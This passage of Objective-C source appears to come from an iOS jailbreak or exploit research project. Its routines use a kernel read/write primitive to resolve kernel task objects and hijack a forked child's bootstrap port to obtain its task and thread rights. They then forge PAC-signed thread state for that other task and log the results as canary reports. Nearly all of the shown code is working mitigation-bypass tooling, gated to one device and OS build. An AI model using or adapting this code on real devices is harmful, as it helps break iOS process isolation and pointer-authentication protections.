    report[@"savedStateResumePCOffset"] = afterSnapshotCaptured &&
        afterPC >= ready.resumePC
        ? @(afterPC - ready.resumePC) : [NSNull null];
    report[@"savedTupleConsumed"] = @(savedTupleConsumed);
    report[@"resumedTupleExact"] = @(resumedTupleExact);
    report[@"jopHashObserved"] = @(jopHashObserved);
    report[@"jopHashChanged"] = @(jopHashChanged);
    report[@"returnedAsEL0t"] = @(returnedAsEL0t);
    report[@"physicalValidatorConsumption"] = @(
        physicalValidatorConsumption);

    /* The worker may make syscalls only after this release. */
    __atomic_store_n(&resumeGate.release, 1, __ATOMIC_RELEASE);

    {
        BOOL success = exactThreadRight && exactTaskRight &&
            deliveredConversion && !rescueConversion &&
            convertedPointersMatch && retainedX17Exact &&
            resumeGatePointerPreserved && replySent && workerResumed &&
            physicalValidatorConsumption;
        report[@"exactPhysicalPACIdentityCanary"] = @(success);
        report[@"exactPhysicalPACValidatorCanary"] = @(success);
        report[@"result"] = success
            ? @"success-physical-pac-validator-consumption"
            : (workerResumed
                ? @"failed-physical-validator-consumption"
                : @"failed-canary-worker-not-resumed");
    }

cleanup:
    __atomic_store_n(&resumeGate.release, 1, __ATOMIC_RELEASE);
    if (workerCreated) {
        if (!workerResumed && ready.setupKR == KERN_SUCCESS &&
            MACH_PORT_VALID(ready.threadPort)) {
            (void)thread_terminate(ready.threadPort);
        }
        (void)pthread_join(worker, NULL);
    }

    if (requestReceived) {
        if (MACH_PORT_VALID(request.thread.name)) {
            (void)mach_port_deallocate(mach_task_self(), request.thread.name);
        }
        if (MACH_PORT_VALID(request.task.name)) {
            (void)mach_port_deallocate(mach_task_self(), request.task.name);
        }
        if (!replySent && MACH_PORT_VALID(request.Head.msgh_remote_port)) {
            (void)mach_port_deallocate(mach_task_self(),
                request.Head.msgh_remote_port);
        }
    }
    if (MACH_PORT_VALID(ready.threadPort)) {
        (void)mach_port_deallocate(mach_task_self(), ready.threadPort);
    }
    if (MACH_PORT_VALID(exceptionPort)) {
        mach_port_type_t type = 0;
        if (mach_port_type(mach_task_self(), exceptionPort, &type) ==
                KERN_SUCCESS && (type & MACH_PORT_TYPE_SEND) != 0) {
            (void)mach_port_mod_refs(mach_task_self(), exceptionPort,
                MACH_PORT_RIGHT_SEND, -1);
        }
        (void)mach_port_destruct(mach_task_self(), exceptionPort, 0, 0);
    }
    for (size_t index = 0; index < 2; index++) {
        if (readyPipe[index] >= 0) close(readyPipe[index]);
        if (goPipe[index] >= 0) close(goPipe[index]);
    }

    report[@"completedAt"] = @([[NSDate date] timeIntervalSince1970]);
    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    NSString *path = [directory stringByAppendingPathComponent:
        @"CNDPhysicalPACValidatorCanary.json"];
    report[@"reportPath"] = path;
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
        options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys
        error:nil];
    report[@"reportSaved"] = @(data && [data writeToFile:path
        options:NSDataWritingAtomic error:nil]);
    return [report copy];
}

static NSDictionary<NSString *, id> *CNDPhysicalPACCrossTaskRunOnce(void)
{
    NSMutableDictionary<NSString *, id> *report = [@{
        @"schema": @"com.zeroxjf.cyanide.physical-pac-cross-task-canary",
        @"schemaVersion": @1,
        @"productType": CNDPhysicalPACSysctlString("hw.machine"),
        @"productBuildVersion": CNDPhysicalPACSysctlString("kern.osversion"),
        @"krwUsed": @YES,
        @"kernelCallUsed": @NO,
        @"persistentMutation": @NO,
        @"crossTaskTarget": @YES,
        @"sacrificialForkChild": @YES,
        @"stockProcessTarget": @NO,
        @"parentHeldChildRightBeforeException": @NO,
        @"exceptionBehavior": @"EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES",
        @"direction": @"THREAD_CONVERT_THREAD_STATE_FROM_SELF",
        @"transport": @"inherited TASK_BOOTSTRAP_PORT",
        @"startedAt": @([[NSDate date] timeIntervalSince1970]),
    } mutableCopy];

    if (!kexploit_krw_ready()) {
        report[@"result"] = @"refused-krw-unavailable";
        report[@"message"] = @"Validated physical KRW is required.";
        return report;
    }

    mach_port_t exceptionPort = CNDPhysicalPACCreateExceptionPort();
    report[@"exceptionPortCreated"] = @(MACH_PORT_VALID(exceptionPort));
    if (!MACH_PORT_VALID(exceptionPort)) {
        report[@"result"] = @"failed-exception-port";
        return report;
    }

    int readyPipe[2] = {-1, -1};
    int resultPipe[2] = {-1, -1};
    mach_port_t originalBootstrap = MACH_PORT_NULL;
    mach_port_t deliveredBootstrap = MACH_PORT_NULL;
    BOOL parentBootstrapChanged = NO;
    BOOL parentBootstrapRestored = NO;
    pid_t child = -1;
    BOOL childExited = NO;
    int childStatus = 0;
    CNDPhysicalPACCrossTaskReady ready = {0};
    CNDPhysicalPACIdentityRequest request = {0};
    BOOL requestReceived = NO;
    BOOL replySent = NO;
    BOOL childResumed = NO;

    if (pipe(readyPipe) != 0 || pipe(resultPipe) != 0) {
        report[@"result"] = @"failed-pipe-setup";
        report[@"errno"] = @(errno);
        goto cleanup;
    }

    uint64_t selfTask = task_self();
    uint64_t selfProc = proc_self();
    uint64_t exceptionPortObject = task_get_ipc_port_object(
        selfTask, exceptionPort);
    BOOL krwPreflight = selfTask && selfProc && exceptionPortObject;
    report[@"krwPreflightVerified"] = @(krwPreflight);
    report[@"selfTask"] = CNDPhysicalPACHex(selfTask);
    report[@"selfProc"] = CNDPhysicalPACHex(selfProc);
    report[@"exceptionIPCObject"] = CNDPhysicalPACHex(exceptionPortObject);
    if (!krwPreflight) {
        report[@"result"] = @"failed-krw-preflight";
        goto cleanup;
    }

    kern_return_t getBootstrapKR = task_get_bootstrap_port(
        mach_task_self(), &originalBootstrap);
    report[@"parentBootstrapGetKR"] = @(getBootstrapKR);
    if (getBootstrapKR != KERN_SUCCESS ||
        !MACH_PORT_VALID(originalBootstrap)) {
        report[@"result"] = @"failed-parent-bootstrap-read";
        goto cleanup;
    }

    kern_return_t setBootstrapKR = task_set_bootstrap_port(
        mach_task_self(), exceptionPort);
    report[@"parentBootstrapSubstituteKR"] = @(setBootstrapKR);
    if (setBootstrapKR != KERN_SUCCESS) {
        report[@"result"] = @"failed-parent-bootstrap-substitute";
        goto cleanup;
    }
    parentBootstrapChanged = YES;

    child = fork();
    int forkErrno = child < 0 ? errno : 0;
    if (child == 0) {
        close(readyPipe[0]);
        close(resultPipe[0]);
        int childResult = CNDPhysicalPACCrossTaskChildMain(
            readyPipe[1], resultPipe[1]);
        _exit(childResult);
    }

    kern_return_t restoreBootstrapKR = task_set_bootstrap_port(
        mach_task_self(), originalBootstrap);
    report[@"parentBootstrapRestoreKR"] = @(restoreBootstrapKR);
    parentBootstrapRestored = restoreBootstrapKR == KERN_SUCCESS;
    parentBootstrapChanged = !parentBootstrapRestored;
    report[@"parentBootstrapRestored"] = @(parentBootstrapRestored);
    report[@"forkErrno"] = @(forkErrno);
    if (!parentBootstrapRestored) {
        report[@"result"] = @"failed-parent-bootstrap-restore";
        goto cleanup;
    }
    if (child < 0) {
        report[@"result"] = @"failed-fork";
        goto cleanup;
    }
    report[@"childPID"] = @(child);

    close(readyPipe[1]);
    readyPipe[1] = -1;
    close(resultPipe[1]);
    resultPipe[1] = -1;

    int readyRead = CNDPhysicalPACReadAllWithTimeout(readyPipe[0], &ready,
        sizeof(ready), CND_PAC_CANARY_TIMEOUT_MS);
    report[@"childReadyRead"] = @(readyRead);
    report[@"childReportedPID"] = @(ready.pid);
    report[@"childInheritedPortKR"] = @(ready.inheritedPortKR);
    report[@"childExceptionSetupKR"] = @(ready.exceptionSetupKR);
    BOOL childReady = readyRead == 0 && ready.pid == child &&
        ready.inheritedPortKR == KERN_SUCCESS &&
        ready.exceptionSetupKR == KERN_SUCCESS && ready.resumePC &&
        ready.fallbackLR;
    report[@"childReady"] = @(childReady);
    if (!childReady) {
        report[@"result"] = @"failed-child-setup";
        goto cleanup;
    }

    uint64_t childProc = proc_find(child);
    uint64_t childTask = childProc ? proc_task(childProc) : 0;
    BOOL distinctKernelTask = childProc && childTask &&
        childProc != selfProc && childTask != selfTask;
    report[@"childProc"] = CNDPhysicalPACHex(childProc);
    report[@"childTask"] = CNDPhysicalPACHex(childTask);
    report[@"distinctKernelTask"] = @(distinctKernelTask);
    if (!distinctKernelTask) {
        report[@"result"] = @"failed-child-kernel-identity";
        goto cleanup;
    }

    kern_return_t receiveKR = CNDPhysicalPACReceiveIdentity(
        exceptionPort, &request);
    report[@"receiveKR"] = @(receiveKR);
    requestReceived = receiveKR == KERN_SUCCESS;
    BOOL requestValid = requestReceived &&
        CNDPhysicalPACRequestIsValid(&request);
    report[@"identityMessageValid"] = @(requestValid);
    report[@"messageID"] = @(request.Head.msgh_id);
    report[@"messageSize"] = @(request.Head.msgh_size);
    report[@"descriptorCount"] = @(request.msgh_body.msgh_descriptor_count);
    report[@"stateFlavor"] = @(request.flavor);
    report[@"stateCount"] = @(request.old_stateCnt);
    if (!requestValid) {
        report[@"result"] = @"failed-identity-message";
        goto cleanup;
    }

    uint64_t deliveredThreadObject = task_get_ipc_port_object(
        selfTask, request.thread.name);
    uint64_t deliveredTaskObject = task_get_ipc_port_object(
        selfTask, request.task.name);
    uint64_t deliveredThread = task_get_ipc_port_kobject(
        selfTask, request.thread.name);
    uint64_t deliveredTask = task_get_ipc_port_kobject(
        selfTask, request.task.name);
    BOOL exactCrossTaskIdentity = deliveredThreadObject &&
        deliveredTaskObject && deliveredThread &&
        deliveredTask == childTask &&
        thread_get_task(deliveredThread) == childTask;
    report[@"deliveredThreadIPCObject"] =
        CNDPhysicalPACHex(deliveredThreadObject);
    report[@"deliveredTaskIPCObject"] = CNDPhysicalPACHex(deliveredTaskObject);
    report[@"deliveredThread"] = CNDPhysicalPACHex(deliveredThread);
    report[@"deliveredTask"] = CNDPhysicalPACHex(deliveredTask);
    report[@"crossTaskIdentityVerified"] = @(exactCrossTaskIdentity);

    kern_return_t taskControlKR = task_get_bootstrap_port(
        request.task.name, &deliveredBootstrap);
    uint64_t deliveredBootstrapObject = taskControlKR == KERN_SUCCESS &&
        MACH_PORT_VALID(deliveredBootstrap)
        ? task_get_ipc_port_object(selfTask, deliveredBootstrap) : 0;
    BOOL exactTaskControlRight = taskControlKR == KERN_SUCCESS &&
        deliveredBootstrapObject == exceptionPortObject;
    report[@"deliveredTaskBootstrapGetKR"] = @(taskControlKR);
    report[@"deliveredBootstrapIPCObject"] =
        CNDPhysicalPACHex(deliveredBootstrapObject);
    report[@"exactTaskControlRight"] = @(exactTaskControlRight);

    arm_thread_state64_internal convertedState = {0};
    memcpy(&convertedState, request.old_state, sizeof(convertedState));
    BOOL deliveredConversion = thread_convert_sign_state_for_target(
        request.thread.name, &convertedState, ready.resumePC,
        ready.fallbackLR);
    report[@"deliveredRightConversionSucceeded"] = @(deliveredConversion);
    uint64_t convertedPC = convertedState.__pc;
    uint64_t convertedLR = convertedState.__lr;
    BOOL convertedPointersMatch = deliveredConversion &&
        (convertedPC & CND_PAC_CANARY_USER_POINTER_MASK) == ready.resumePC &&
        (convertedLR & CND_PAC_CANARY_USER_POINTER_MASK) == ready.fallbackLR;
    report[@"convertedPointersMatch"] = @(convertedPointersMatch);
    report[@"convertedPC"] = CNDPhysicalPACHex(convertedPC);
    report[@"convertedLR"] = CNDPhysicalPACHex(convertedLR);

    if (deliveredConversion && convertedPointersMatch) {
        kern_return_t replyKR = CNDPhysicalPACReplyIdentity(
            &request, &convertedState);
        report[@"replyKR"] = @(replyKR);
        replySent = replyKR == KERN_SUCCESS;
    } else {
        report[@"replyKR"] = @(KERN_FAILURE);
    }

    if (replySent) {
        uint8_t didResume = 0;
        int resultRead = CNDPhysicalPACReadAllWithTimeout(resultPipe[0],
            &didResume, sizeof(didResume), CND_PAC_CANARY_TIMEOUT_MS);
        childResumed = resultRead == 0 && didResume == 1;
        report[@"childResultRead"] = @(resultRead);
    }
    report[@"childResumed"] = @(childResumed);

    if (childResumed) {
        int waitResult = CNDPhysicalPACWaitPID(
            child, &childStatus, CND_PAC_CANARY_TIMEOUT_MS);
        report[@"childWaitResult"] = @(waitResult);
        childExited = waitResult == 0;
    }
    BOOL childExitedCleanly = childExited && WIFEXITED(childStatus) &&
        WEXITSTATUS(childStatus) == 0;
    report[@"childExitedCleanly"] = @(childExitedCleanly);
    if (childExited) {
        report[@"childExitStatus"] = WIFEXITED(childStatus)
            ? @(WEXITSTATUS(childStatus)) : @(-1);
    }

    {
        BOOL success = parentBootstrapRestored && distinctKernelTask &&
            exactCrossTaskIdentity && exactTaskControlRight &&
            deliveredConversion && convertedPointersMatch && replySent &&
            childResumed && childExitedCleanly;
        report[@"exactPhysicalPACCrossTaskCanary"] = @(success);
        report[@"result"] = success
            ? @"success-physical-pac-cross-task-canary"
            : @"failed-physical-pac-cross-task-canary";
    }

cleanup:
    if (parentBootstrapChanged && MACH_PORT_VALID(originalBootstrap)) {
        kern_return_t cleanupRestoreKR = task_set_bootstrap_port(
            mach_task_self(), originalBootstrap);
        report[@"cleanupBootstrapRestoreKR"] = @(cleanupRestoreKR);
        parentBootstrapRestored = cleanupRestoreKR == KERN_SUCCESS;
        report[@"parentBootstrapRestored"] = @(parentBootstrapRestored);
    }
    if (child > 0 && !childExited) {
        (void)kill(child, SIGKILL);
        int killedStatus = 0;
        int killWaitResult = CNDPhysicalPACWaitPID(
            child, &killedStatus, CND_PAC_CANARY_TIMEOUT_MS);
        report[@"cleanupChildKillWaitResult"] = @(killWaitResult);
        report[@"cleanupChildKilled"] = @(killWaitResult == 0);
    }
    if (MACH_PORT_VALID(deliveredBootstrap)) {
        (void)mach_port_deallocate(mach_task_self(), deliveredBootstrap);
    }
    if (requestReceived) {
        if (MACH_PORT_VALID(request.thread.name)) {
            (void)mach_port_deallocate(mach_task_self(), request.thread.name);
        }
        if (MACH_PORT_VALID(request.task.name)) {
            (void)mach_port_deallocate(mach_task_self(), request.task.name);
        }
        if (!replySent && MACH_PORT_VALID(request.Head.msgh_remote_port)) {
            (void)mach_port_deallocate(mach_task_self(),
                request.Head.msgh_remote_port);
        }
    }
    if (MACH_PORT_VALID(originalBootstrap)) {
        (void)mach_port_deallocate(mach_task_self(), originalBootstrap);
    }
    if (MACH_PORT_VALID(exceptionPort)) {
        mach_port_type_t type = 0;
        if (mach_port_type(mach_task_self(), exceptionPort, &type) ==
                KERN_SUCCESS && (type & MACH_PORT_TYPE_SEND) != 0) {
            (void)mach_port_mod_refs(mach_task_self(), exceptionPort,
                MACH_PORT_RIGHT_SEND, -1);
        }
        (void)mach_port_destruct(mach_task_self(), exceptionPort, 0, 0);
    }
    for (size_t index = 0; index < 2; index++) {
        if (readyPipe[index] >= 0) close(readyPipe[index]);
        if (resultPipe[index] >= 0) close(resultPipe[index]);
    }

    report[@"completedAt"] = @([[NSDate date] timeIntervalSince1970]);
    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    NSString *path = [directory stringByAppendingPathComponent:
        @"CNDPhysicalPACCrossTaskCanary.json"];
    report[@"reportPath"] = path;
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
        options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys
        error:nil];
    report[@"reportSaved"] = @(data && [data writeToFile:path
        options:NSDataWritingAtomic error:nil]);
    return [report copy];
}

BOOL CNDPhysicalPACIdentityCanaryIsSupported(
    NSString * _Nullable * _Nullable reasonOut)
{
    NSString *product = CNDPhysicalPACSysctlString("hw.machine");
    NSString *build = CNDPhysicalPACSysctlString("kern.osversion");
    BOOL physical = !cnd_lab_vphone_guest();
    BOOL supported = physical &&
        [product isEqualToString:@CND_PAC_CANARY_PRODUCT] &&
        [build isEqualToString:@CND_PAC_CANARY_BUILD];
    if (reasonOut) {
        if (!physical) {
            *reasonOut = @"Physical-device canary; vPhone guests are refused.";
        } else if (supported) {
            *reasonOut = @"Exact physical iPhone17,2 / 23A341 target matched.";
        } else {
            *reasonOut = [NSString stringWithFormat:
                @"Requires physical iPhone17,2 on 23A341; this device is %@ on %@.",
                product.length ? product : @"unknown hardware",
                build.length ? build : @"unknown build"];
        }
    }
    return supported;
}

BOOL CNDPhysicalPACIdentityCanaryIsRunning(void)
{
    return __sync_fetch_and_add(&gCNDPhysicalPACCanaryRunning, 0) != 0;
}

void CNDPhysicalPACIdentityCanaryRun(
    CNDPhysicalPACIdentityCanaryCompletion completion)
{
    if (!completion) return;
    NSString *supportReason = nil;
    if (!CNDPhysicalPACIdentityCanaryIsSupported(&supportReason)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-unsupported-device",
                @"message": supportReason ?: @"Unsupported device.",
            });
        });
        return;
    }
    if (!__sync_bool_compare_and_swap(
            &gCNDPhysicalPACCanaryRunning, 0, 1)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-already-running",
                @"message": @"The physical PAC canary is already running.",
            });
        });
        return;
    }

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary<NSString *, id> *report = CNDPhysicalPACRunOnce();
        __sync_lock_release(&gCNDPhysicalPACCanaryRunning);
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(report ?: @{ @"result": @"unknown-result" });
        });
    });
}

BOOL CNDPhysicalPACCrossTaskCanaryIsSupported(
    NSString * _Nullable * _Nullable reasonOut)
{
    return CNDPhysicalPACIdentityCanaryIsSupported(reasonOut);
}

BOOL CNDPhysicalPACCrossTaskCanaryIsRunning(void)
{
    return __sync_fetch_and_add(
        &gCNDPhysicalPACCrossTaskCanaryRunning, 0) != 0;
}

void CNDPhysicalPACCrossTaskCanaryRun(
    CNDPhysicalPACIdentityCanaryCompletion completion)
{
    if (!completion) return;
    NSString *supportReason = nil;
    if (!CNDPhysicalPACCrossTaskCanaryIsSupported(&supportReason)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-unsupported-device",
                @"message": supportReason ?: @"Unsupported device.",
            });
        });
        return;
    }
    if (!__sync_bool_compare_and_swap(
            &gCNDPhysicalPACCrossTaskCanaryRunning, 0, 1)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-already-running",
                @"message": @"The physical cross-task PAC canary is already running.",
            });
        });
        return;
    }

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary<NSString *, id> *report =
            CNDPhysicalPACCrossTaskRunOnce();
        __sync_lock_release(&gCNDPhysicalPACCrossTaskCanaryRunning);
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(report ?: @{ @"result": @"unknown-result" });
        });
    });
}
